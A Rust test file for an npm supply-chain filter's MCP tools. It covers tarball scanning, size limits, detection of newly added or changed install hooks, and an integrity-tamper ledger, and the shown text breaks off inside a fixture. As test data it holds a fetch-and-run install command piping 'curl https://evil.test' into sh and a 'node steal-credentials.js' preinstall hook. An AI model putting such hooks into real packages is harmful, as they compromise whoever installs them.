//! Tests for the MCP shim — DESIGN.md "MCP surface".
//!
//! The tarball fixtures are built in-test with `tar` + `flate2`; no test reaches the network
//! and no test opens a database on disk.

use std::io::Write;
use std::sync::Arc;

use chrono::{DateTime, TimeZone, Utc};
use flate2::Compression;
use flate2::write::GzEncoder;
use serde_json::{Value, json};
use sha2::Digest;

use super::blocks;
use super::inspect::{
    self, TarballError, TarballLimits, previous_version, scan_tarball, script_delta,
};
use super::*;
use crate::config::Config;
use crate::control::{Actor, ControlService};
use crate::policy::{self, PolicyConfig};
use crate::store::{NewRule, ScriptSet, Store};

/// The actor the daemon would derive from a connection's peer credentials.
fn actor() -> Actor {
    Actor {
        uid: 1000,
        gid: 1000,
        pid: Some(4242),
        label: String::new(),
    }
    .with_label("mcp")
}

fn now() -> DateTime<Utc> {
    Utc.with_ymd_and_hms(2026, 8, 4, 12, 0, 0)
        .single()
        .expect("valid timestamp")
}

/// Build a gzipped tar in memory, exactly as npm publishes one.
fn tarball(entries: &[(&str, &[u8])]) -> Vec<u8> {
    let encoder = GzEncoder::new(Vec::new(), Compression::default());
    let mut builder = tar::Builder::new(encoder);
    for (path, contents) in entries {
        let mut header = tar::Header::new_gnu();
        header.set_size(u64::try_from(contents.len()).expect("size fits"));
        header.set_mode(0o644);
        header.set_mtime(0);
        builder
            .append_data(&mut header, path, *contents)
            .expect("append entry");
    }
    let encoder = builder.into_inner().expect("finish tar");
    encoder.finish().expect("finish gzip")
}

fn package_json(scripts: Value) -> Vec<u8> {
    json!({ "name": "widget", "version": "1.2.3", "scripts": scripts })
        .to_string()
        .into_bytes()
}

// -- tar / package.json extraction ------------------------------------------------------------

#[test]
fn package_json_is_read_out_of_a_streamed_tarball_and_nothing_else_is_kept() {
    let manifest_bytes = package_json(json!({ "postinstall": "node install.js" }));
    let bytes = tarball(&[
        ("package/README.md", b"# widget\n"),
        ("package/package.json", &manifest_bytes),
        ("package/lib/index.js", b"module.exports = 1;\n"),
        ("package/lib/big.bin", &vec![7u8; 40_000]),
    ]);

    let scan = scan_tarball(bytes.as_slice(), &TarballLimits::default()).expect("scan succeeds");

    let manifest = scan.package_json.as_ref().expect("package.json was found");
    assert_eq!(manifest.get("name").and_then(Value::as_str), Some("widget"));
    assert_eq!(
        scan.package_json_path.as_deref(),
        Some("package/package.json")
    );
    assert_eq!(scan.file_count, 4);
    assert_eq!(
        scan.unpacked_bytes,
        9 + u64::try_from(manifest_bytes.len()).expect("size fits") + 20 + 40_000
    );
    assert_eq!(
        scan.compressed_bytes,
        u64::try_from(bytes.len()).expect("size fits"),
        "the whole stream was read, and only package.json was retained"
    );

    let scripts = ScriptSet::from_version(manifest);
    assert_eq!(
        scripts.hooks().get("postinstall").map(String::as_str),
        Some("node install.js")
    );
}

#[test]
fn only_the_manifest_at_the_archive_root_counts_as_package_json() {
    let decoy = json!({ "name": "decoy", "version": "9.9.9" })
        .to_string()
        .into_bytes();
    let bytes = tarball(&[
        ("package/lib/package.json", &decoy),
        ("package/nested/deep/package.json", &decoy),
        (
            "package/package.json",
            &package_json(json!({ "install": "node-gyp rebuild" })),
        ),
    ]);

    let scan = scan_tarball(bytes.as_slice(), &TarballLimits::default()).expect("scan succeeds");
    let manifest = scan.package_json.as_ref().expect("package.json was found");
    assert_eq!(manifest.get("name").and_then(Value::as_str), Some("widget"));
    assert_eq!(
        scan.package_json_path.as_deref(),
        Some("package/package.json")
    );
}

#[test]
fn a_tarball_without_a_root_manifest_scans_clean_and_reports_none() {
    let bytes = tarball(&[("package/lib/index.js", b"1\n")]);
    let scan = scan_tarball(bytes.as_slice(), &TarballLimits::default()).expect("scan succeeds");
    assert!(scan.package_json.is_none());
    assert_eq!(scan.file_count, 1);
}

#[test]
fn a_root_directory_other_than_package_is_still_read() {
    let bytes = tarball(&[(
        "widget-1.2.3/package.json",
        &package_json(json!({ "preinstall": "echo hi" })),
    )]);
    let scan = scan_tarball(bytes.as_slice(), &TarballLimits::default()).expect("scan succeeds");
    assert!(scan.package_json.is_some());
    assert_eq!(
        scan.package_json_path.as_deref(),
        Some("widget-1.2.3/package.json")
    );
}

#[test]
fn a_corrupt_gzip_stream_is_an_error_not_a_panic() {
    let error = scan_tarball(
        b"not a gzip stream at all".as_slice(),
        &TarballLimits::default(),
    )
    .expect_err("garbage must fail");
    assert!(matches!(error, TarballError::Read(_)), "{error:?}");
}

#[test]
fn a_root_manifest_that_is_not_json_is_an_error_not_a_panic() {
    let bytes = tarball(&[("package/package.json", b"{ not json")]);
    let error = scan_tarball(bytes.as_slice(), &TarballLimits::default())
        .expect_err("bad manifest must fail");
    assert!(matches!(error, TarballError::PackageJson(_)), "{error:?}");
}

// -- the size limits --------------------------------------------------------------------------

#[test]
fn the_compressed_limit_abandons_an_oversized_download() {
    let bytes = tarball(&[
        ("package/package.json", &package_json(json!({}))),
        ("package/blob.bin", &vec![9u8; 200_000]),
    ]);
    let limits = TarballLimits {
        max_compressed_bytes: 64,
        ..TarballLimits::default()
    };
    let error = scan_tarball(bytes.as_slice(), &limits).expect_err("must trip the limit");
    assert!(
        matches!(error, TarballError::CompressedLimit { limit: 64 }),
        "{error:?}"
    );
}

#[test]
fn the_unpacked_limit_stops_a_gzip_bomb() {
    // 4 MiB of zeros compresses to a few kilobytes: the compressed limit would never fire.
    let bytes = tarball(&[
        ("package/package.json", &package_json(json!({}))),
        ("package/zeros.bin", &vec![0u8; 4 * 1024 * 1024]),
    ]);
    assert!(
        bytes.len() < 64 * 1024,
        "the fixture really is a compression bomb ({} bytes)",
        bytes.len()
    );

    let limits = TarballLimits {
        max_unpacked_bytes: 128 * 1024,
        ..TarballLimits::default()
    };
    let error = scan_tarball(bytes.as_slice(), &limits).expect_err("must trip the limit");
    assert!(
        matches!(error, TarballError::UnpackedLimit { limit: 131_072 }),
        "{error:?}"
    );

    // The same archive scans fine once the limit allows it.
    let scan = scan_tarball(bytes.as_slice(), &TarballLimits::default()).expect("scan succeeds");
    assert_eq!(scan.file_count, 2);
}

#[test]
fn the_package_json_limit_refuses_an_oversized_manifest() {
    let mut manifest = json!({ "name": "widget", "version": "1.0.0" });
    manifest["padding"] = Value::String("x".repeat(50_000));
    let bytes = tarball(&[("package/package.json", manifest.to_string().as_bytes())]);

    let limits = TarballLimits {
        max_package_json_bytes: 1024,
        ..TarballLimits::default()
    };
    let error = scan_tarball(bytes.as_slice(), &limits).expect_err("must trip the limit");
    assert!(
        matches!(error, TarballError::PackageJsonLimit { limit: 1024 }),
        "{error:?}"
    );
}

#[test]
fn the_entry_limit_stops_an_archive_with_too_many_files() {
    let contents: Vec<(String, Vec<u8>)> = (0..40)
        .map(|index| (format!("package/f{index}.js"), b"1\n".to_vec()))
        .collect();
    let entries: Vec<(&str, &[u8])> = contents
        .iter()
        .map(|(path, data)| (path.as_str(), data.as_slice()))
        .collect();
    let bytes = tarball(&entries);

    let limits = TarballLimits {
        max_entries: 10,
        ..TarballLimits::default()
    };
    let error = scan_tarball(bytes.as_slice(), &limits).expect_err("must trip the limit");
    assert!(
        matches!(error, TarballError::EntryLimit { limit: 10 }),
        "{error:?}"
    );
}

#[test]
fn entries_larger_than_the_package_json_budget_are_walked_past_not_buffered() {
    // Every non-manifest entry is bigger than max_package_json_bytes; scanning still succeeds,
    // which is only possible because those bodies are skipped rather than read into memory.
    let filler = vec![3u8; 512 * 1024];
    let manifest_bytes = package_json(json!({}));
    let bytes = tarball(&[
        ("package/a.bin", &filler),
        ("package/package.json", &manifest_bytes),
        ("package/b.bin", &filler),
    ]);
    let limits = TarballLimits {
        max_package_json_bytes: 4096,
        ..TarballLimits::default()
    };
    let scan = scan_tarball(bytes.as_slice(), &limits).expect("scan succeeds");
    assert!(scan.package_json.is_some());
    assert_eq!(scan.file_count, 3);
    assert_eq!(
        scan.unpacked_bytes,
        512 * 1024 * 2 + u64::try_from(manifest_bytes.len()).expect("size fits")
    );
}

// -- the script delta -------------------------------------------------------------------------

fn scripts(pairs: &[(&str, &str)]) -> ScriptSet {
    ScriptSet::from_hooks(pairs.iter().map(|(hook, command)| (*hook, *command)))
}

#[test]
fn a_version_that_newly_acquires_an_install_hook_is_flagged() {
    // keyv@6.0.0 gaining a preinstall when 5.x had none — DESIGN.md's own example.
    let delta = script_delta(
        Some(("5.3.1", &scripts(&[]))),
        &scripts(&[("preinstall", "node setup.mjs")]),
    );
    assert!(delta.compared);
    assert!(delta.newly_acquires_install_hooks);
    assert_eq!(delta.previous_version.as_deref(), Some("5.3.1"));
    assert_eq!(delta.added.len(), 1);
    assert_eq!(delta.added[0].hook, "preinstall");
    assert_eq!(delta.added[0].command, "node setup.mjs");
    assert_eq!(
        delta.added[0].sha256,
        crate::store::hex_encode(sha2::Sha256::digest(b"node setup.mjs").as_slice()),
        "the hash is sha256 over the command bytes"
    );
    assert!(delta.removed.is_empty());
    assert!(delta.changed.is_empty());
    assert!(
        delta.summary.contains("NEWLY ACQUIRED INSTALL HOOKS"),
        "{}",
        delta.summary
    );
}

#[test]
fn a_changed_command_is_reported_with_both_hashes() {
    let delta = script_delta(
        Some(("1.0.0", &scripts(&[("install", "node-gyp rebuild")]))),
        &scripts(&[("install", "curl https://evil.test | sh")]),
    );
    assert!(!delta.newly_acquires_install_hooks);
    assert_eq!(delta.changed.len(), 1);
    let change = &delta.changed[0];
    assert_eq!(change.hook, "install");
    assert_eq!(change.previous, "node-gyp rebuild");
    assert_eq!(change.current, "curl https://evil.test | sh");
    assert_ne!(change.previous_sha256, change.current_sha256);
    assert!(delta.summary.contains("1 changed"), "{}", delta.summary);
}

#[test]
fn identical_hooks_report_no_change() {
    let before = scripts(&[("postinstall", "node install.js")]);
    let after = scripts(&[("postinstall", "node install.js")]);
    let delta = script_delta(Some(("0.21.4", &before)), &after);
    assert!(delta.added.is_empty());
    assert!(delta.changed.is_empty());
    assert!(delta.removed.is_empty());
    assert_eq!(delta.unchanged.len(), 1);
    assert!(
        delta.summary.contains("COMMANDS are identical to 0.21.4"),
        "{}",
        delta.summary
    );
}

#[test]
fn a_removed_hook_is_reported_too() {
    let delta = script_delta(
        Some(("2.0.0", &scripts(&[("preinstall", "node old.js")]))),
        &scripts(&[]),
    );
    assert_eq!(delta.removed.len(), 1);
    assert!(delta.added.is_empty());
    assert!(
        delta.summary.contains("removed since 2.0.0"),
        "{}",
        delta.summary
    );
}

#[test]
fn the_first_published_version_has_nothing_to_compare_against() {
    let delta = script_delta(None, &scripts(&[("install", "node x.js")]));
    assert!(!delta.compared);
    assert!(!delta.newly_acquires_install_hooks);
    assert!(delta.previous_version.is_none());
    assert!(
        delta.summary.contains("no previous published version"),
        "{}",
        delta.summary
    );
}

#[test]
fn every_hook_of_a_multi_hook_version_is_diffed() {
    let delta = script_delta(
        Some((
            "1.0.0",
            &scripts(&[("preinstall", "a"), ("install", "b"), ("postinstall", "c")]),
        )),
        &scripts(&[("install", "b"), ("postinstall", "changed")]),
    );
    assert_eq!(delta.removed.len(), 1);
    assert_eq!(delta.removed[0].hook, "preinstall");
    assert_eq!(delta.unchanged.len(), 1);
    assert_eq!(delta.unchanged[0].hook, "install");
    assert_eq!(delta.changed.len(), 1);
    assert_eq!(delta.changed[0].hook, "postinstall");
}

// -- previous published version -----------------------------------------------------------------

fn packument_with_times() -> Value {
    json!({
        "name": "keyv",
        "dist-tags": { "latest": "6.0.0" },
        "time": {
            "created": "2019-01-01T00:00:00.000Z",
            "5.0.0": "2021-01-01T00:00:00.000Z",
            "5.3.1": "2022-06-01T00:00:00.000Z",
            "6.0.0": "2026-08-01T00:00:00.000Z"
        },
        "versions": {
            "5.0.0": { "name": "keyv", "version": "5.0.0", "dist": { "integrity": "sha512-A" } },
            "5.3.1": { "name": "keyv", "version": "5.3.1", "dist": { "integrity": "sha512-B" } },
            "6.0.0": {
                "name": "keyv", "version": "6.0.0",
                "scripts": { "preinstall": "node setup.mjs" },
                "dist": { "integrity": "sha512-C" }
            }
        }
    })
}

#[test]
fn the_previous_published_version_is_the_one_published_immediately_before() {
    let packument = packument_with_times();
    assert_eq!(
        previous_version(&packument, "6.0.0").as_deref(),
        Some("5.3.1")
    );
    assert_eq!(
        previous_version(&packument, "5.3.1").as_deref(),
        Some("5.0.0")
    );
    assert_eq!(previous_version(&packument, "5.0.0"), None);
}

#[test]
fn publish_order_wins_over_semver_order() {
    // 1.9.0 is a backport published after 2.0.0, so 2.0.0's predecessor is 1.0.0, not 1.9.0.
    let packument = json!({
        "name": "backported",
        "time": {
            "1.0.0": "2024-01-01T00:00:00.000Z",
            "2.0.0": "2024-06-01T00:00:00.000Z",
            "1.9.0": "2024-09-01T00:00:00.000Z"
        },
        "versions": {
            "1.0.0": { "version": "1.0.0" },
            "1.9.0": { "version": "1.9.0" },
            "2.0.0": { "version": "2.0.0" }
        }
    });
    assert_eq!(
        previous_version(&packument, "2.0.0").as_deref(),
        Some("1.0.0")
    );
    assert_eq!(
        previous_version(&packument, "1.9.0").as_deref(),
        Some("2.0.0"),
        "1.9.0 was published after 2.0.0"
    );
}

#[test]
fn semver_order_is_the_fallback_when_the_packument_has_no_times() {
    let packument = json!({
        "name": "untimed",
        "versions": {
            "1.0.0": { "version": "1.0.0" },
            "1.10.0": { "version": "1.10.0" },
            "1.9.0": { "version": "1.9.0" }
        }
    });
    assert_eq!(
        previous_version(&packument, "1.10.0").as_deref(),
        Some("1.9.0"),
        "1.9.0 < 1.10.0 by semver, even though it sorts later as a string"
    );
    assert_eq!(previous_version(&packument, "1.0.0"), None);
}

// -- the whole inspect report ---------------------------------------------------------------

#[test]
fn the_inspect_report_carries_everything_design_asks_for() {
    let mut packument = packument_with_times();
    packument["versions"]["6.0.0"]["dist"] = json!({
        "integrity": "sha512-C",
        "tarball": "https://registry.npmjs.org/keyv/-/keyv-6.0.0.tgz",
        "fileCount": 12,
        "unpackedSize": 40_960,
        "signatures": [{ "keyid": "SHA256:x", "sig": "y" }],
        "attestations": {
            "url": "https://registry.npmjs.org/-/npm/v1/attestations/keyv@6.0.0",
            "provenance": { "predicateType": "https://slsa.dev/provenance/v1" }
        }
    });
    packument["versions"]["6.0.0"]["_npmUser"] = json!({ "name": "attacker", "email": "a@b.test" });
    packument["versions"]["6.0.0"]["maintainers"] =
        json!([{ "name": "jaredwray", "email": "jared@test" }]);

    let scan = inspect::TarballScan {
        files: Vec::new(),
        package_json: Some(json!({
            "name": "keyv", "version": "6.0.0",
            "scripts": { "preinstall": "node setup.mjs" }
        })),
        package_json_path: Some("package/package.json".to_owned()),
        file_count: 12,
        unpacked_bytes: 40_960,
        compressed_bytes: 9_001,
    };

    let report = inspect::build_report(
        "keyv",
        "6.0.0",
        "dist-tags.latest",
        &packument,
        &scan,
        TarballLimits::default(),
        now(),
    );

    assert_eq!(report.package, "keyv");
    assert_eq!(
        report.published.as_deref(),
        Some("2026-08-01T00:00:00.000Z")
    );
    assert_eq!(report.age_days, Some(3));
    assert_eq!(report.age.as_deref(), Some("3 days old"));
    assert_eq!(report.dist_integrity.as_deref(), Some("sha512-C"));
    assert_eq!(
        report.dist_tarball.as_deref(),
        Some("https://registry.npmjs.org/keyv/-/keyv-6.0.0.tgz")
    );
    assert_eq!(report.install_hooks.len(), 1);
    assert_eq!(report.install_hooks[0].command, "node setup.mjs");
    assert!(!report.install_hooks[0].sha256.is_empty());
    assert!(report.scripts_match_packument);
    assert!(report.script_delta.newly_acquires_install_hooks);
    assert_eq!(
        report.script_delta.previous_version.as_deref(),
        Some("5.3.1")
    );
    assert_eq!(
        report.maintainers,
        vec!["jaredwray <jared@test>".to_owned()]
    );
    assert_eq!(report.npm_user.as_deref(), Some("attacker"));
    assert!(report.provenance.attested);
    assert_eq!(
        report.provenance.predicate_types,
        vec!["https://slsa.dev/provenance/v1".to_owned()]
    );
    assert_eq!(report.provenance.signatures, 1);
    assert_eq!(report.file_count.registry, Some(12));
    assert_eq!(report.file_count.observed, 12);
    assert_eq!(report.unpacked_size.registry, Some(40_960));
    assert_eq!(report.compressed_bytes, 9_001);
    assert!(
        report
            .notes
            .iter()
            .any(|note| note.contains("NEWLY ACQUIRED")),
        "{:?}",
        report.notes
    );
}

#[test]
fn a_tarball_whose_hooks_differ_from_the_packument_is_called_out() {
    let mut packument = packument_with_times();
    packument["versions"]["6.0.0"]["scripts"] = json!({ "preinstall": "node build.js" });

    let scan = inspect::TarballScan {
        files: Vec::new(),
        package_json: Some(json!({
            "name": "keyv", "version": "6.0.0",
            "scripts": { "preinstall": "node steal-credentials.js" }
        })),
        package_json_path: Some("package/package.json".to_owned()),
        file_count: 1,
        unpacked_bytes: 10,
        compressed_bytes: 10,
    };

    let report = inspect::build_report(
        "keyv",
        "6.0.0",
        "requested",
        &packument,
        &scan,
        TarballLimits::default(),
        now(),
    );
    assert!(!report.scripts_match_packument);
    assert_eq!(report.packument_install_hooks[0].command, "node build.js");
    assert_eq!(report.install_hooks[0].command, "node steal-credentials.js");
    assert!(
        report.notes.iter().any(|note| note.contains("DIFFER")),
        "{:?}",
        report.notes
    );
}

#[test]
fn the_version_defaults_to_dist_tags_latest_and_a_missing_one_is_rejected() {
    let packument = packument_with_times();
    let (version, source) =
        inspect::resolve_version(&packument, "keyv", None).expect("latest resolves");
    assert_eq!(version, "6.0.0");
    assert_eq!(source, "dist-tags.latest");

    let (version, source) =
        inspect::resolve_version(&packument, "keyv", Some("5.0.0")).expect("explicit resolves");
    assert_eq!(version, "5.0.0");
    assert_eq!(source, "requested");

    let error = inspect::resolve_version(&packument, "keyv", Some("9.9.9"))
        .expect_err("unknown version is an error");
    assert!(
        matches!(error, inspect::InspectError::UnknownVersion { .. }),
        "{error:?}"
    );
}

// -- recent blocks ----------------------------------------------------------------------------

#[test]
fn recent_blocks_recovers_the_offending_commands_from_a_real_audit_row() {
    // Drive the whole chain the daemon drives: policy engine -> audit rows -> MCP answer.
    let store = Store::open_in_memory().expect("in-memory store");
    let packument = json!({
        "name": "esbuild",
        "dist-tags": { "latest": "0.21.5" },
        "time": { "0.21.5": "2024-01-01T00:00:00.000Z" },
        "versions": {
            "0.21.5": {
                "name": "esbuild", "version": "0.21.5",
                "scripts": { "postinstall": "node install.js" },
                "dist": { "integrity": "sha512-ESBUILD" }
            }
        }
    });
    let outcome = policy::evaluate(&packument, &store, &store, &PolicyConfig::default(), now())
        .expect("policy runs");
    assert_eq!(outcome.blocked.len(), 1);
    store
        .record_blocks("esbuild", &outcome.blocked, now())
        .expect("audit written");

    let audit = store.recent_audit(None, 10).expect("audit read");
    let recent: Vec<_> = audit
        .iter()
        .filter(|record| blocks::is_block(record))
        .map(blocks::from_audit)
        .collect();

    assert_eq!(recent.len(), 1);
    let block = &recent[0];
    assert_eq!(block.package, "esbuild");
    assert_eq!(block.version.as_deref(), Some("0.21.5"));
    assert_eq!(block.reason.as_deref(), Some("install_script"));
    assert_eq!(block.severity, "warning");
    assert_eq!(block.scripts.len(), 1, "{block:?}");
    assert_eq!(block.scripts[0].hook, "postinstall");
    assert_eq!(block.scripts[0].command, "node install.js");
    assert!(block.next_step.contains("npmfilter_inspect"), "{block:?}");
}

#[test]
fn an_integrity_change_surfaces_as_a_critical_block_with_a_do_not_approve_step() {
    let store = Store::open_in_memory().expect("in-memory store");
    let record = crate::policy::BlockRecord::new(
        "1.0.0",
        crate::policy::BlockReason::IntegrityChanged,
        "integrity ledger: foo@1.0.0 was first recorded as sha512-A but upstream now serves a \
         different value (fingerprint sha256:0123456789abcdef)",
    );
    store
        .record_blocks("foo", std::slice::from_ref(&record), now())
        .expect("audit written");

    let audit = store.recent_audit(Some("foo"), 10).expect("audit read");
    let block = blocks::from_audit(&audit[0]);
    assert_eq!(block.event, "tamper");
    assert_eq!(block.severity, "critical");
    assert_eq!(block.reason.as_deref(), Some("integrity_changed"));
    assert!(block.scripts.is_empty());
    assert!(block.next_step.contains("CRITICAL"), "{block:?}");
    assert!(block.next_step.contains("npmfilter_ledger"), "{block:?}");
}

#[test]
fn a_command_containing_a_semicolon_is_not_split_in_half() {
    let hooks = blocks::parse_hooks(
        "install hooks present — preinstall: node a.js; node b.js; postinstall: node c.js",
    );
    assert_eq!(hooks.len(), 2, "{hooks:?}");
    assert_eq!(hooks[0].hook, "preinstall");
    assert_eq!(hooks[0].command, "node a.js; node b.js");
    assert_eq!(hooks[1].hook, "postinstall");
    assert_eq!(hooks[1].command, "node c.js");
}

#[test]
fn a_detail_with_no_hook_list_yields_no_commands() {
    assert!(
        blocks::parse_hooks(
            "published 2026-08-01T00:00:00Z (3 days old), under the 30-day minimum"
        )
        .is_empty()
    );
    let (reason, detail) = blocks::split_reason("too_new: published yesterday");
    assert_eq!(reason, Some(crate::policy::BlockReason::TooNew));
    assert_eq!(detail, "published yesterday");
}

#[test]
fn an_unrecognised_detail_prefix_is_left_intact() {
    let (reason, detail) = blocks::split_reason("something else: entirely");
    assert!(reason.is_none());
    assert_eq!(detail, "something else: entirely");
}

// -- the tools --------------------------------------------------------------------------------

/// The daemon-side implementation the control socket dispatches to. These tests drive it
/// directly; `control::tests` drives the same code across a real socket.
fn test_service() -> ControlService {
    let config = Config {
        listen: "127.0.0.1:1".parse().expect("valid address"),
        min_age_days: 30,
        bypass_scopes: vec!["@olamedia".to_owned()],
        ..Config::default()
    };
    let store = Arc::new(Store::open_in_memory().expect("in-memory store"));
    ControlService::new(Arc::new(config), store).expect("service builds")
}

#[tokio::test]
async fn status_reports_the_policy_the_rule_counts_and_the_socket_transport() {
    let service = test_service();
    service
        .store()
        .record_rule(&NewRule::allow("esbuild", "0.21.5", "sha512-E"), now())
        .expect("rule recorded");
    service
        .store()
        .record_rule(&NewRule::deny("keyv", "6.0.0"), now())
        .expect("rule recorded");

    let report = service.status().await.expect("status succeeds");
    assert_eq!(report.rules.allow, 1);
    assert_eq!(report.rules.deny, 1);
    assert_eq!(report.policy.min_age_days, 30);
    assert_eq!(report.policy.bypass_scopes, vec!["@olamedia".to_owned()]);
    // The answer came out of the daemon over its own socket, so it is running by construction.
    assert!(report.daemon.reachable);
    assert!(
        report.transport.contains("unix socket"),
        "the shim no longer shares the database: {report:?}"
    );
    assert!(report.transport.contains("only writer"), "{report:?}");
}

#[tokio::test]
async fn deny_records_a_rule_that_the_policy_engine_then_honours() {
    let service = test_service();
    let written = service
        .deny("keyv", "6.0.0", Some("Shai-Hulud".to_owned()), &actor())
        .await
        .expect("deny succeeds");
    assert_eq!(written.rule.verdict, "deny");
    assert_eq!(written.rule.reason.as_deref(), Some("Shai-Hulud"));
    // The actor is the peer the kernel identified, not anything the request claimed.
    assert_eq!(
        written.rule.actor.as_deref(),
        Some("uid=1000 pid=4242 via=mcp")
    );

    let packument = json!({
        "name": "keyv",
        "dist-tags": { "latest": "6.0.0" },
        "time": { "6.0.0": "2020-01-01T00:00:00.000Z" },
        "versions": {
            "6.0.0": { "name": "keyv", "version": "6.0.0", "dist": { "integrity": "sha512-C" } }
        }
    });
    let outcome = policy::evaluate(
        &packument,
        service.store().as_ref(),
        service.store().as_ref(),
        &PolicyConfig::default(),
        now(),
    )
    .expect("policy runs");
    assert!(outcome.surviving_versions().is_empty());
    assert_eq!(
        outcome.blocked[0].reason,
        crate::policy::BlockReason::DenyRule
    );
}

#[tokio::test]
async fn rules_lists_what_is_recorded_and_rejects_a_bad_verdict() {
    let service = test_service();
    service
        .store()
        .record_rule(
            &NewRule::allow("esbuild", "0.21.5", "sha512-E")
                .with_scripts(scripts(&[("postinstall", "node install.js")]))
                .with_reason("build tool")
                .with_actor("npmfilter seed"),
            now(),
        )
        .expect("rule recorded");
    service
        .store()
        .record_rule(&NewRule::deny("keyv", "6.0.0"), now())
        .expect("rule recorded");

    let all = service.rules(None, None).await.expect("rules succeeds");
    assert_eq!(all.count, 2);

    let allows = service
        .rules(None, Some("allow"))
        .await
        .expect("rules succeeds");
    assert_eq!(allows.count, 1);
    let rule = &allows.rules[0];
    assert_eq!(rule.package, "esbuild");
    assert_eq!(rule.integrity.as_deref(), Some("sha512-E"));
    assert_eq!(rule.scripts.len(), 1);
    assert_eq!(rule.scripts[0].command, "node install.js");
    assert!(rule.scripts_sha256.is_some());
    assert_eq!(rule.actor.as_deref(), Some("npmfilter seed"));

    let rejected = service.rules(None, Some("maybe")).await;
    let error = match rejected {
        Ok(_) => panic!("a bad verdict must be rejected"),
        Err(error) => error,
    };
    assert!(error.to_string().contains("allow"), "{error:?}");
}

#[tokio::test]
async fn recent_blocks_is_filterable_and_says_what_to_do_when_empty() {
    let service = test_service();
    let empty = service
        .recent_blocks(None, None)
        .await
        .expect("recent_blocks succeeds");
    assert_eq!(empty.count, 0);
    assert!(empty.note.contains("no blocks recorded"), "{empty:?}");

    for package in ["esbuild", "sqlite3"] {
        let record = crate::policy::BlockRecord::new(
            "1.0.0",
            crate::policy::BlockReason::InstallScript,
            "install hooks present — install: node-gyp rebuild",
        );
        service
            .store()
            .record_blocks(package, std::slice::from_ref(&record), now())
            .expect("audit written");
    }
    // An approval also lands in the audit log and must not show up as a block.
    service
        .store()
        .record_rule_audited(&NewRule::allow("esbuild", "1.0.0", "sha512-E"), now())
        .expect("rule recorded");

    let all = service
        .recent_blocks(None, None)
        .await
        .expect("recent_blocks succeeds");
    assert_eq!(
        all.count, 2,
        "the `allow` audit row is not a block: {all:?}"
    );

    let filtered = service
        .recent_blocks(Some("sqlite3".to_owned()), Some(5))
        .await
        .expect("recent_blocks succeeds");
    assert_eq!(filtered.count, 1);
    assert_eq!(filtered.blocks[0].package, "sqlite3");
    assert_eq!(filtered.blocks[0].scripts[0].command, "node-gyp rebuild");
}

#[tokio::test]
async fn the_ledger_reports_the_recorded_hashes_and_any_replacement() {
    let service = test_service();
    service
        .store()
        .try_observe("foo", "1.0.0", Some("sha512-A"), now())
        .expect("observed");
    service
        .store()
        .try_observe("foo", "2.0.0", Some("sha512-B"), now())
        .expect("observed");
    let changed = service
        .store()
        .try_observe("foo", "1.0.0", Some("sha512-EVIL"), now())
        .expect("observed");
    assert!(matches!(
        changed,
        crate::policy::LedgerCheck::Changed { .. }
    ));
    service
        .store()
        .append_audit(&crate::store::AuditEntry::tamper(
            "foo",
            "1.0.0",
            "integrity_changed: integrity ledger: foo@1.0.0 was first recorded as sha512-A but \
             upstream now serves a different value (fingerprint sha256:0123456789abcdef)",
            now(),
        ))
        .expect("audit written");

    let report = service
        .ledger("foo".to_owned())
        .await
        .expect("ledger succeeds");
    assert_eq!(report.count, 2);
    let first = report
        .versions
        .iter()
        .find(|entry| entry.version == "1.0.0")
        .expect("1.0.0 is in the ledger");
    assert_eq!(
        first.integrity.as_deref(),
        Some("sha512-A"),
        "the first hash is never overwritten"
    );
    assert_eq!(report.integrity_changed.len(), 1);
    assert!(report.note.contains("CHANGED HASH"), "{report:?}");
    // The stored hash is frozen, so the counter is the only thing that can show a replacement
    // being retried.
    assert_eq!(first.mismatch_count, 1, "{first:?}");
    assert!(first.last_mismatch.is_some(), "{first:?}");

    let again = service
        .store()
        .try_observe("foo", "1.0.0", Some("sha512-EVIL"), now())
        .expect("observed");
    assert!(matches!(again, crate::policy::LedgerCheck::Changed { .. }));
    let report = service
        .ledger("foo".to_owned())
        .await
        .expect("ledger succeeds");
    let first = report
        .versions
        .iter()
        .find(|entry| entry.version == "1.0.0")
        .expect("1.0.0 is in the ledger");
    assert_eq!(first.mismatch_count, 2, "a repeated attempt is visible");
    assert_eq!(
        first.integrity.as_deref(),
        Some("sha512-A"),
        "and the evidence still never moves"
    );
}

#[tokio::test]
async fn the_server_advertises_all_seven_design_tools() {
    let server = McpServer::new(&Config::default());
    let tools: Vec<String> = server
        .tool_router
        .list_all()
        .into_iter()
        .map(|tool| tool.name.to_string())
        .collect();

    for expected in [
        "npmfilter_status",
        "npmfilter_recent_blocks",
        "npmfilter_inspect",
        "npmfilter_allow",
        "npmfilter_deny",
        "npmfilter_rules",
        "npmfilter_ledger",
    ] {
        assert!(
            tools.contains(&expected.to_owned()),
            "missing {expected}: {tools:?}"
        );
    }
    assert_eq!(tools.len(), 7, "{tools:?}");

    let info = server.get_info();
    assert!(info.capabilities.tools.is_some());
    assert_eq!(info.server_info.name, "npmfilter");
    assert!(
        info.instructions
            .as_deref()
            .unwrap_or_default()
            .contains("npmfilter_recent_blocks"),
        "the client is told where to start"
    );
}

/// Silence the unused-import warning for `Write`, which the fixture builder needs on some paths.
#[test]
fn fixture_builder_produces_a_real_gzip_stream() {
    let bytes = tarball(&[("package/package.json", &package_json(json!({})))]);
    assert_eq!(&bytes[..2], &[0x1f, 0x8b], "gzip magic");
    let mut sink = Vec::new();
    sink.write_all(&bytes).expect("write");
    assert_eq!(sink.len(), bytes.len());
}

// -- end to end over HTTP, against a local stub registry ---------------------------------------
//
// These drive the real streaming path: reqwest -> bounded channel -> blocking gzip/tar reader.
// The stub is bound to port 0 on loopback; registry.npmjs.org is never contacted.

/// `widget` — 1.0.0 runs nothing, 1.1.0 newly acquires a preinstall. Tarball URLs point at the
/// stub, so `inspect` fetches from it exactly as it would from the real registry.
fn stub_packument(address: std::net::SocketAddr) -> Value {
    json!({
        "name": "widget",
        "dist-tags": { "latest": "1.1.0" },
        "time": {
            "1.0.0": "2024-01-01T00:00:00.000Z",
            "1.1.0": "2026-07-25T00:00:00.000Z"
        },
        "maintainers": [{ "name": "someone", "email": "someone@example.test" }],
        "versions": {
            "1.0.0": {
                "name": "widget", "version": "1.0.0",
                "scripts": { "test": "mocha" },
                "dist": {
                    "integrity": "sha512-ONE",
                    "tarball": format!("http://{address}/widget/-/widget-1.0.0.tgz")
                }
            },
            "1.1.0": {
                "name": "widget", "version": "1.1.0",
                "scripts": { "preinstall": "node setup.mjs", "test": "mocha" },
                "_npmUser": { "name": "publisher", "email": "p@example.test" },
                "dist": {
                    "integrity": "sha512-TWO",
